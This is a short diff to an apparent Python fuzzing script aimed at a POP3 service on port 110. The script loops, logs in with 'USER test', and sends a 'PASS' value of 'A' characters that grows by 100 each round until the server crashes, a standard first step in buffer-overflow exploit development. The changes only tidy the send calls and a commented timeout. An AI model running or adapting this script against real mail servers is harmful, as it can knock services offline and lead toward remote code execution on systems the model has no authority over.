@@ -8,17 +8,19 @@ PORT = 110
 
 buffer = "A" * 100
 
+send = lambda s,cmd,payload : s.send((cmd + payload + '\r\n').encode())
+
 while True:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # s.settimeout(3)
+        # s.settimeout(20)
         s.connect((TARGET, PORT))
         s.recv(1024)
-        s.send(('USER test\r\n').encode())
+        send(s, 'USER', 'test')
         s.recv(1024)
-        s.send(('PASS ' + buffer + '\r\n').encode())
+        send(s, 'PASS', buffer)
         s.recv(1024)
-        s.send(('QUIT\r\n').encode())
+        send(s, 'QUIT', '')
         s.close()
         buffer = buffer + "A" * 100
         print(len(buffer))
